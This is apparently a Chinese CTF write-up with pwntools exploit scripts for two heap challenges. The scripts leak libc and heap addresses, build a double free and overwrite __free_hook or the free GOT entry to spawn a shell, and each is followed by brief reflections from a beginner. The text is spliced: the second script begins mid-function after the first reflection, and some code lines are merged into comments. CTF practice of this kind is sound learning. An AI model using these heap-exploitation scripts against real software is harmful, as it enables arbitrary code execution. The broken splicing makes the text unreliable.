    #coding:utf-8
    from pwn import *
    #from LibcSearcher import *
    context(os='linux',arch='amd64')
    #context.log_level = 'debug'
    p = process('./daily')
    def add(size,payload):
        p.recvuntil('choice:')
        p.sendline('2')
        p.recvuntil('daily:')
        p.sendline(str(size))
        p.recvuntil('dailyn')
        p.send(payload)
    def view():
        p.recvuntil('choice:')
        p.sendline('1')
    def delete(index):
        p.recvuntil('choice:')
        p.sendline('4')
        p.recvuntil('daily:')
        p.sendline(str(index))
    def upgrade(index,payload):
        p.recvuntil('choice:')
        p.sendline('3')
        p.recvuntil('daily:')
        p.sendline(str(index))
        p.recvuntil('dailyn')
        p.send(payload)
    payload = 'x66'*0x200
    add(len(payload),payload)     #index 0
    add(len(payload),payload)     #index 1
    add(len(payload),payload)     #index 2
    add(len(payload),payload)     #index 3
    delete(1)                     #delete 1
    delete(2)                     #delete 2
    payload = 'x12'*8
    add(0x1a0,payload)            #index 1 
    #------------------------------------------------利用large chunkl来leak libcbase和heapbase---------------------------------    view()
    p.recvuntil('x12x12x12x12x12x12x12x12')
    main_arena_addr = u64(p.recv(6).ljust(8,'x00')) - (0xf68-0xb20)
    log.success('main_arena_addr = '+hex(main_arena_addr))
    libcbase = main_arena_addr - (0x4be5b20-0x4821000)
    log.success('libcbase = '+hex(libcbase))
    payload = 'x12'*12+'x21'*4
    upgrade(1,payload)
    view()
    p.recvuntil('x21x21x21x21')
    heap_addr = u64(p.recv(4).ljust(8,'x00')) - 0x210
    log.success('heap_addr = '+hex(heap_addr))
    #gdb.attach(p)
    #-----------------------------------------------leak success--------------------------------------    payload = 'a'*8
    add(0x31,payload)            #index 2  
    #------------------------------------------------prepare doublefree--------------------------------    payload = p64(0)+p64(0x31) 
    payload+= p64(0)*2
    payload+= p64(0x20)+p64(heap_addr+0x20)
    payload+= p64(0)+p64(0x31)
    payload+= p64(0)*2
    payload+= p64(0x20)+p64(heap_addr+0x50)
    payload+= p64(0)+p64(0x31)
    upgrade(0,payload)
    index = (heap_addr + 0x30 - 0x602060)/0x10
    delete(index)
    index = (heap_addr + 0x60 - 0x602060)/0x10
    delete(index)
    payload = p64(0)+p64(0x31) 
    payload+= p64(0)*2
    payload+= p64(0x20)+p64(heap_addr+0x20)
    payload+= p64(0)+p64(0x31)
    upgrade(0,payload)
    index = (heap_addr + 0x30 - 0x602060)/0x10
    delete(index)
    #-----------------------------------------------double free success--------------------------------    payload = p64(0x602078) 
    add(0x20,payload)                     #index 3
    free_hook = libcbase + (0x1728f7a8 - 0x16ec9000)
    log.success('free_hook = ' + hex(free_hook))
    payload = p64(free_hook)
    add(0x20,payload)                                 #index 4
    add(0x20,payload)                                 #index 5
    add(0x20,payload)                                 #index 6
    one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
    upgrade(2,p64(one_gadget[1]+libcbase))
    delete(4)
    p.interactive()
**0x36 收货：**
可能需要对free()的检查机制了解的比较深入才能得心应手的快速解出这一题，我第一遍因为思路不清晰导致不知道改了一个什么东西总是报错，第二遍整理一下思路才Pwn掉，挺丢人的。。。。。题目出的稳中有活，难度也适合像我这种初学者，感觉出的不错。。。。>_ ')
        p.sendline('1')
        p.recvuntil('data:n')
        p.sendline(payload)
    def edit(index,payload):
        p.recvuntil('> ')
        p.sendline('3')
        p.recvuntil('index: ')
        p.sendline(str(index))
        p.sendline(payload)
    def delete(index):
        p.recvuntil('> ')
        p.sendline('4')
        p.recvuntil('index: ')
        p.sendline(str(index))
    def list_(index):
        p.recvuntil('> ')
        p.sendline('2')
        p.recvuntil('index: ')
        p.sendline(str(index))
    new('x11'*0xf)    #index 0          
    new('x11'*0xf)    #index 1             0和1共用content chunk
    new('x22'*0x7f)   #index 2
    new('x22'*0x7f)   #index 3             2和3共用content chunk
    new('x44'*0xf)   #index 4              防topchunk合并
    #gdb.attach(p)
    delete(3)
    #-------------------------------------leak libcbase and system_addr and heap-----------------------    list_(2)
    main_arena_addr = u64(p.recv(6).ljust(8,'x00')) - 88
    log.success('main_arena = '+hex(main_arena_addr))    
    libcbase = main_arena_addr - (0xdd8b20-0xa14000)
    log.success('libcbase = '+hex(libcbase))
    system_addr = libcbase + (0xbab390 - 0xb66000)
    log.success('system_addr = '+hex(system_addr))
    #gdb.attach(p)
    delete(1)
    list_(0)
    heap_addr = u64(p.recv(4).ljust(8,'x00')) - 0x110
    log.success('heap_addr = '+hex(heap_addr))
    #--------------------------------------leak success------------------------------------------------    new('x55'*0xf)          #index 5
    new('x66'*0xf)          #      6
    new('x77'*0xf)          #      7
    new('x88'*0xf)          #      8
    payload = '/bin/shx00'
    payload+= 'x55'*0x10
    payload+= p64(0x21)
    payload+= 'x07'+'x00'*3+'x0f'+'x00'*3
    payload+= p64(P.got['free'])
    payload+= p64(heap_addr+0xf0)
    payload+= p64(0x21)
    payload+= 'x22'*0x18
    payload+= p64(0x31)
    payload+= 'x08'+'x00'*3+'x0f'+'x00'*3
    payload+= p64(heap_addr+0x90)                  #“/bin/shx00”的地址。
    edit(2,payload)
    payload = p64(system_addr)
    edit(7,payload)
    delete(8)
    p.interactive()
**0x45 收货：**
感觉挺有趣的，链表形式的题目还是很有趣，觉得无论是doublefree还是什么，对glibc的机制了如指掌才是真正的王道。。。对每一块chunk的来源和去向和他们什么时候该有什么内容都在心中清楚才能最快的找到思路并且在调试上节约时间。。。这一题最后是100p多一点，比daily还高，可能考的堆机制的理解更深一点吧。。。。
## 结语:
虽然报名出现了操蛋的问题，但还是很开心能做出来四道基础题，对于学了一年不到的我来说已经是一件很开心的事情了orz。。。接下来就该静下心准备tsctf了。。天枢等我！！！